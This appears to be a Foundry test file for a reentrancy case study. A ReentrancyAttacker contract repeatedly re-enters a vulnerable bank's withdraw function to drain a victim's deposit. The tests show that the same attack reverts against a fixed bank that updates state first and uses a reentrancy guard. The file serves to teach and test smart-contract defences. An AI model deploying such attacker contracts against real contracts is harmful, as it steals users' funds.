// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { VulnerableBank } from "../../src/vulnerabilities/VulnerableBank.sol";
import { FixedBank } from "../../src/vulnerabilities/FixedBank.sol";

// Malicious contract that re-enters withdrawEther during the receive callback.
contract ReentrancyAttacker {
    VulnerableBank public targetBank;
    uint256 public reentrancyCount;

    constructor(address bankAddress) {
        targetBank = VulnerableBank(payable(bankAddress));
    }

    function attack() external payable {
        targetBank.depositEther{value: msg.value}();
        targetBank.withdrawEther();
    }

    receive() external payable {
        if (address(targetBank).balance >= msg.value && reentrancyCount < 5) {
            reentrancyCount++;
            targetBank.withdrawEther();
        }
    }
}

// Attacker contract for FixedBank, expected to fail.
contract ReentrancyAttackerFixed {
    FixedBank public targetBank;

    constructor(address bankAddress) {
        targetBank = FixedBank(payable(bankAddress));
    }

    function attack() external payable {
        targetBank.depositEther{value: msg.value}();
        targetBank.withdrawEther();
    }

    receive() external payable {
        if (address(targetBank).balance > 0) {
            targetBank.withdrawEther();
        }
    }
}

contract ReentrancyCaseStudyTest is Test {
    VulnerableBank public vulnerableBank;
    FixedBank public fixedBank;
    address public victim = address(0xBEEF);

    function setUp() public {
        vulnerableBank = new VulnerableBank();
        fixedBank = new FixedBank();

        // Pre-fund both banks with a victim's deposit so the attacker can drain.
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vulnerableBank.depositEther{value: 10 ether}();

        vm.deal(victim, 10 ether);
        vm.prank(victim);
        fixedBank.depositEther{value: 10 ether}();
    }

    // BEFORE FIX: attacker can drain the victim's deposit through reentrancy.
    function test_Before_VulnerableBank_AttackerDrainsBeyondDeposit() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(vulnerableBank));
        vm.deal(address(this), 1 ether);

        uint256 bankBalanceBefore = address(vulnerableBank).balance;
        assertEq(bankBalanceBefore, 10 ether);

        attacker.attack{value: 1 ether}();

        // Attacker deposited 1 ETH but drained more.
        assertGt(address(attacker).balance, 1 ether);
        // Bank balance is now much lower than 10 ETH victim deposit.
        assertLt(address(vulnerableBank).balance, 10 ether);
    }

    // AFTER FIX: attacker cannot drain because state is updated before transfer
    // and nonReentrant guards against reentry.
    function test_After_FixedBank_AttackerCannotDrain() public {
        ReentrancyAttackerFixed attacker = new ReentrancyAttackerFixed(address(fixedBank));
        vm.deal(address(this), 1 ether);

        uint256 bankBalanceBefore = address(fixedBank).balance;
        assertEq(bankBalanceBefore, 10 ether);

        vm.expectRevert();
        attacker.attack{value: 1 ether}();

        // Bank still holds the victim's deposit untouched.
        assertEq(address(fixedBank).balance, 10 ether);
    }
}